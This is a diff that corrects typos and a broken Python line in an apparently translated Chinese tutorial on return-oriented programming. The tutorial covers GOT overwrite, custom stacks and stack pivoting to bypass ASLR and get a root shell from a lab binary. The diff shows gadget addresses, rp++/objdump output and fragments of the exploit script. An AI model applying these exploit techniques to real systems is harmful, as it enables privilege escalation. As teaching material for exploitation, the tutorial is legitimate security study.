@@ -97,9 +97,9 @@ A total of 65 gadgets found.
 $
 ```
 太棒了！ 我们找到了一个’add gadget’用来将结果拷贝到内存区域！  
-现在，如果我们EBX中含有GOT[getuid]-0x5d5b04c4, EAX中含有偏移差，我们就可以执行GOT覆盖了！  
+现在，如果我们EBX中含有 `GOT[getuid] - 0x5d5b04c4`, EAX中含有偏移差，我们就可以执行GOT覆盖了！  
 
--Gadget 2: 确保EBX中含有getuid的GOT表项。getuid的GOT表项(如下所示)位于0x8041004处。因此，EBX必须要读入0x804a004, 但是在add gadget中一个常量(0x5d5b04c4)添加到了EBX中，我们就从EBX中减去那个常量： ebx =0x804a004 -0x5d5b04c4 = 0xaaa99b40。 现在我们需要找到一个gadget用来将这个值(0xaaa99b40)拷贝到EBX寄存器中。  
+-Gadget 2: 确保EBX中含有getuid的GOT表项。getuid的GOT表项(如下所示)位于0x804a004处。因此，EBX必须要读入0x804a004, 但是在add gadget中一个常量(0x5d5b04c4)添加到了EBX中，我们就从EBX中减去那个常量： ebx =0x804a004 -0x5d5b04c4 = 0xaaa99b40。 现在我们需要找到一个gadget用来将这个值(0xaaa99b40)拷贝到EBX寄存器中。  
   
 ``` bash
 $ objdump -R vuln
@@ -172,7 +172,7 @@ $
 
 ## 0X07 利用ROP做到GOT解引用
 
--Gadget 1: 首先，我们需要一个gadget来讲偏移差添加到GOT[getuid]中，结果需要加载到寄存器中。因此，我们来找出一个’add gadget’将结果拷贝到寄存器中  
+-Gadget 1: 首先，我们需要一个gadget来将偏移差添加到GOT[getuid]中，结果需要加载到寄存器中。因此，我们来找出一个’add gadget’将结果拷贝到寄存器中  
 
 ``` bash
 $ ~/roptools/rp++ --atsyntax -f ./vuln -r 4
@@ -236,7 +236,7 @@ $
 
 使用下面命令反汇编’vuln’二进制文件  
 
-`$objdump -d vuln > out`
+`$objdump -d vuln > out`  
 -Gadget 4: 将偏移差（0xfffff530)加载到EAX寄存器。反汇编中可以看到，一条mov指令可以将栈中的内容拷贝到EAX中。  
 
 ``` 
@@ -399,7 +399,8 @@ ebx = 0x3fc9c18 #ebx = 0x8049f3c - (esi*4) + 0xe0
 off = 0xfffff530
 #endianess convertion
 def conv(num):
- return struct.pack("<I",num* 268 #Junk
+ return struct.pack("<I",num) #Junk
+buf = "A"*268
 buf += conv(g7) #movb $0x1,0x804a028; add esp, 0x04; pop ebx; pop ebp; ret;
 buf += conv(dummy)
 buf += conv(dummy)
@@ -458,13 +459,13 @@ seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3
 * execve_arg1 - 文件名 - 字符串“/bin/sh”的地址
 * execve_arg2 - argv - 参数数组的地址，内容为[ “/bin/sh”的地址, NULL]
 * execve_arg3 - envp - NULL
-在这篇文章中，由于我们没有直接用0来溢出缓冲区(0是个不好的字符), 我们利用strcpy调用链拷贝0用来替代setuid_arg。反由于栈是被随机化的，这种方法在这里并不可行， 找出setuid_arg栈的地址变得困难起来。  
+在这篇文章中，由于我们没有直接用0来溢出缓冲区(0是个不好的字符), 我们利用strcpy调用链拷贝0用来替代setuid_arg。但由于栈是被随机化的，这种方法在这里并不可行， 找出setuid_arg栈的地址变得困难起来。  
 
 ### 如何绕过栈地址随机化
 可以利用自定义栈和栈旋转(stack pivoting)技术做到！  
 
 ### 什么是自定义栈
-自定义栈就是被攻击者控制的栈区域。攻击者拷贝libc函数链以及相应的参数来绕过栈随机化。由于攻击者进程的选择任意非位置独立(non position independent）并可写的内存区域作为自定义栈。在我们的二进制文件’vuln’中，可写并非位置独立的内存区域是从0x804a000到0x804b000（如下所示)  
+自定义栈就是被攻击者控制的栈区域。攻击者拷贝libc函数链以及相应的参数来绕过栈随机化，攻击者选择任意非位置独立(non position independent）并可写的内存区域作为自定义栈。在我们的二进制文件’vuln’中，可写并非位置独立的内存区域是从0x804a000到0x804b000（如下所示)  
 
 ```
 $ cat /proc//maps
@@ -484,15 +485,15 @@ b7fff000-b8000000 rw-p 00020000 08:01 1711743 /lib/i386-linux-gnu/ld-2.15.so
 bffdf000-c0000000 rw-p 00000000 00:00 0 [stack]
 $
 ```
-含有.data和.bss段的内存区域可以用来当做自定义栈。我将自定义站的位置选为0x804a360.  
+含有.data和.bss段的内存区域可以用来当做自定义栈，我将自定义栈的位置选为0x804a360。  
 
-选择选择好自定义栈位置后，我们需要拷贝libc函数链以及相应的参数到自定义栈中。在我们的例子中，将下面的libx函数(以及相应的参数)拷贝到自定义栈中，以用来触发root shell。  
+选择选择好自定义栈位置后，我们需要拷贝libc函数链以及相应的参数到自定义栈中。在我们的例子中，将下面的libc函数(以及相应的参数)拷贝到自定义栈中，以用来触发root shell。  
 
 seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3  
 为了将这些内容拷贝到自定义栈，我们需要利用一系列strcpy调用来覆盖真实栈中的返回地址。比如，为了将seteuid@PLT (0x80483c0)拷贝到自定义栈中，我们需要  
 
 * 四个strcpy调用- 每个十六进制值分别有一个strcpy调用(0x08, 0x04, 0x83, 0xc0)
-	- strcpy的源参数必须是含有必需的十六进制值的可执行内存区域的地址。另外我们需要确保选择的内存区域的值不能被修改。
+* strcpy的源参数必须是含有必需的十六进制值的可执行内存区域的地址。另外我们需要确保选择的内存区域的值不能被修改。
 * strcpy的目的参数必须是自定义栈的地址
 
 遵守以上原则，我们可以设置完整的自定义栈。一旦设置好了自定义栈，我们需要利用栈旋转技术(stack pivoting)将真实栈移到自定义栈中  
@@ -503,7 +504,7 @@ seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3
 mov ebp, esp
 pop ebp
 ```
-因此，在执行”leave“指令之前，将自定义栈的地址加载到EBP中–当“leave”执行后，将ESP指向EBP！ 这样就已经旋转了自定义栈，我们继续执行加载到自定义栈中的一系列libc函数，就可以触发root shell了。  
+因此，在执行”leave“指令之前，将自定义栈的地址加载到EBP中--当“leave”执行后，将ESP指向EBP！ 这样就已经旋转了自定义栈，我们继续执行加载到自定义栈中的一系列libc函数，就可以触发root shell了。  
 
 完整漏洞利用代码：  
 ``` python
@@ -580,7 +581,8 @@ pr_addr = 0x080484a3          #popl %ebp ; ret ;
 lr_addr = 0x08048569          #leave ; ret ;
 #endianess convertion
 def conv(num):
- return struct.pack("<I",num* 268 #Junk
+ return struct.pack("<I",num) #Junk
+buf = "A"*268
 buf += conv(g7)               #movb $0x1,0x804a028; add esp, 0x04; pop ebx; pop ebp; ret;
 buf += conv(dummy)
 buf += conv(dummy)
